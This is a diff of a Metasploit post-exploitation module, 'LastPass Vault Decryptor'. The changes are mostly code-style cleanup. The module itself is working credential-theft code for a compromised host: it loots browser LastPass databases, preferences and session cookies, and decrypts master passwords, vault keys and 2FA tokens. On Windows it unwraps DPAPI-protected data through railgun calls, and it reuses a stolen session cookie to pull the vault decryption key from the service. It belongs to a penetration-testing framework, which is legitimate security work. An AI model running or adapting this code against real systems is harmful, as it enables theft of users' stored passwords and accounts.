@@ -13,26 +13,27 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Unix
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'LastPass Vault Decryptor',
-      'Description' => %q{
-        This module extracts and decrypts LastPass master login accounts and passwords,
-        encryption keys, 2FA tokens and all the vault passwords
-      },
-      'License' => MSF_LICENSE,
-      'Author' =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'LastPass Vault Decryptor',
+        'Description' => %q{
+          This module extracts and decrypts LastPass master login accounts and passwords,
+          encryption keys, 2FA tokens and all the vault passwords
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Alberto Garcia Illera <agarciaillera[at]gmail.com>', # original module and research
           'Martin Vigo <martinvigo[at]gmail.com>', # original module and research
           'Jon Hart <jon_hart[at]rapid7.com>' # module rework and cleanup
         ],
-      'Platform'     => %w(linux osx unix win),
-      'References'   =>
-        [
+        'Platform' => %w(linux osx unix win),
+        'References' => [
           [ 'URL', 'http://www.martinvigo.com/even-the-lastpass-will-be-stolen-deal-with-it' ]
         ],
-      'SessionTypes' => %w(meterpreter shell)
-    ))
+        'SessionTypes' => %w(meterpreter shell)
+      )
+    )
   end
 
   def run
@@ -250,6 +251,7 @@ class MetasploitModule < Msf::Post
     else # Firefox
       loot_path = loot_file(prefs_path, nil, 'firefox.preferences', "text/javascript", "Firefox preferences file")
       return [] unless loot_path
+
       File.readlines(loot_path).each do |line|
         if /user_pref\("extensions.lastpass.loginusers", "(?<encoded_users>.*)"\);/ =~ line
           usernames = encoded_users.split("|")
@@ -268,6 +270,7 @@ class MetasploitModule < Msf::Post
     # Get encrypted master passwords
     data = windows_unprotect(data) if data != nil && data.match(/^AQAAA.+/) # Verify Windows protection
     return credentials if data.blank? # No passwords stored
+
     creds_per_user = data.split("|")
     creds_per_user.each_with_index do |user_creds, index|
       parts = user_creds.split('=')
@@ -282,15 +285,14 @@ class MetasploitModule < Msf::Post
     return nil if encrypted_data.blank?
 
     if encrypted_data.include?("|") # Use CBC
-      decipher = OpenSSL::Cipher.new("AES-256-CBC")
+      decipher = OpenSSL::Cipher.new("AES-256-CBC").decrypt
       decipher.iv = Rex::Text.decode_base64(encrypted_data[1, 24]) # Discard ! and |
       encrypted_data = encrypted_data[26..-1] # Take only the data part
     else # Use ECB
-      decipher = OpenSSL::Cipher.new("AES-256-ECB")
+      decipher = OpenSSL::Cipher.new("AES-256-ECB").decrypt
     end
 
     begin
-      decipher.decrypt
       decipher.key = key
       decrypted_data = decipher.update(Rex::Text.decode_base64(encrypted_data)) + decipher.final
     rescue OpenSSL::Cipher::CipherError => e
@@ -326,6 +328,7 @@ class MetasploitModule < Msf::Post
           loot_path = loot_file(lp_data['lp_db_path'], nil, "#{browser.downcase}.lastpass.database", "application/x-sqlite3", "#{account}'s #{browser} LastPass database #{lp_data['lp_db_path']}")
           account_map[account][browser]['lp_db_loot'] = loot_path
           next if loot_path.blank?
+
           # Parsing/Querying the DB
           db = SQLite3::Database.new(loot_path)
           result = db.execute(
@@ -425,7 +428,7 @@ class MetasploitModule < Msf::Post
             )
 
             if result.size == 1 && !result[0].blank?
-              if  /iterations=(?<iterations>.*);(?<vault>.*)/ =~ result[0][0]
+              if /iterations=(?<iterations>.*);(?<vault>.*)/ =~ result[0][0]
                 lp_data['lp_creds'][username]['iterations'] = iterations
               else
                 lp_data['lp_creds'][username]['iterations'] = 1
@@ -457,6 +460,7 @@ class MetasploitModule < Msf::Post
             if lp_data['lp_creds'][username]['vault_key'].nil? # If no vault key was found yet, try with dOTP
               otpbin = extract_otpbin(browser, username, lp_data)
               otpbin.blank? ? next : otpbin = otpbin[0..31]
+
               lp_data['lp_creds'][username]['vault_key'] = decrypt_vault_key_with_otp(username, otpbin)
             end
           end
@@ -477,6 +481,7 @@ class MetasploitModule < Msf::Post
         cookies_files.each do |cookie_jar_file|
           data = read_remote_file(lp_data['cookies_db'] + system_separator + cookie_jar_file)
           next if data.blank?
+
           if /.*PHPSESSID.(?<session_cookie_value_match>.*?).lastpass\.com?/m =~ data # Find the session id
             loot_file(lp_data['cookies_db'] + system_separator + cookie_jar_file, nil, "#{browser.downcase}.lastpass.cookies", "text/plain", "#{account}'s #{browser} cookies DB")
             session_cookie_value = session_cookie_value_match
@@ -498,6 +503,7 @@ class MetasploitModule < Msf::Post
         # Parsing/Querying the DB
         loot_path = loot_file(lp_data['cookies_db'], nil, "#{browser.downcase}.lastpass.cookies", "application/x-sqlite3", "#{account}'s #{browser} cookies DB")
         next if loot_path.blank?
+
         db = SQLite3::Database.new(loot_path)
         begin
           result = db.execute(query)
@@ -506,6 +512,7 @@ class MetasploitModule < Msf::Post
           next
         end
         next if result.blank? # No session cookie found for this browser
+
         session_cookie_value = result[0][0]
       end
       return if session_cookie_value.blank?
@@ -517,7 +524,7 @@ class MetasploitModule < Msf::Post
         begin
           decipher = OpenSSL::Cipher.new("AES-256-CBC")
           decipher.decrypt
-          decipher.key = OpenSSL::Digest::SHA256.hexdigest("peanuts")
+          decipher.key = OpenSSL::Digest.hexdigest('SHA256', "peanuts")
           decipher.iv = " " * 16
           session_cookie_value = session_cookie_value[3..-1] # Discard v10
           session_cookie_value = decipher.update(session_cookie_value) + decipher.final
@@ -535,6 +542,7 @@ class MetasploitModule < Msf::Post
 
       # Parse response
       next unless response.body.match(/pwdeckey\="([a-z0-9]+)"/) # Session must have expired
+
       decryption_key = OpenSSL::Digest::SHA256.hexdigest(response.body.match(/pwdeckey\="([a-z0-9]+)"/)[1])
       username = response.body.match(/lpusername="([A-Za-z0-9._%+-@]+)"/)[1]
 
@@ -625,13 +633,12 @@ class MetasploitModule < Msf::Post
   end
 
   def pbkdf2(password, salt, iterations, key_length)
-    digest = OpenSSL::Digest::SHA256.new
+    digest = OpenSSL::Digest.new('SHA256')
     OpenSSL::PKCS5.pbkdf2_hmac(password, salt, iterations, key_length, digest).unpack 'H*'
   end
 
   def windows_unprotect(data)
     data = Rex::Text.decode_base64(data)
-    rg = session.railgun
     pid = session.sys.process.getpid
     process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
     mem = process.memory.allocate(data.length + 200)
@@ -640,18 +647,19 @@ class MetasploitModule < Msf::Post
     if session.sys.process.each_process.find { |i| i["pid"] == pid } ["arch"] == "x86"
       addr = [mem].pack("V")
       len = [data.length].pack("V")
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
+      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 8)
       len, addr = ret["pDataOut"].unpack("V2")
     else
       addr = Rex::Text.pack_int64le(mem)
       len = Rex::Text.pack_int64le(data.length)
-      ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
+      ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, nil, nil, nil, 0, 16)
       pData = ret["pDataOut"].unpack("VVVV")
       len = pData[0] + (pData[1] << 32)
       addr = pData[2] + (pData[3] << 32)
     end
 
     return "" if len == 0
+
     process.memory.read(addr, len)
   end
 
@@ -726,13 +734,12 @@ class MetasploitModule < Msf::Post
     return nil if key.blank? || encrypted_data.blank?
 
     if encrypted_data[0] == "!" # Apply CBC
-      decipher = OpenSSL::Cipher.new("AES-256-CBC")
+      decipher = OpenSSL::Cipher.new("AES-256-CBC").decrypt
       decipher.iv = encrypted_data[1, 16] # Discard !
       encrypted_data = encrypted_data[17..-1]
     else # Apply ECB
-      decipher = OpenSSL::Cipher.new("AES-256-ECB")
+      decipher = OpenSSL::Cipher.new("AES-256-ECB").decrypt
     end
-    decipher.decrypt
     decipher.key = [key].pack "H*"
 
     begin
@@ -776,6 +783,7 @@ class MetasploitModule < Msf::Post
       root_key, base_key = session.sys.registry.splitkey(key)
       reg_key = session.sys.registry.open_key(root_key, base_key, KEY_READ)
       return nil unless reg_key
+
       reg_value = reg_key.query_value(value)
       return nil unless reg_value
     rescue Rex::Post::Meterpreter::RequestError => e
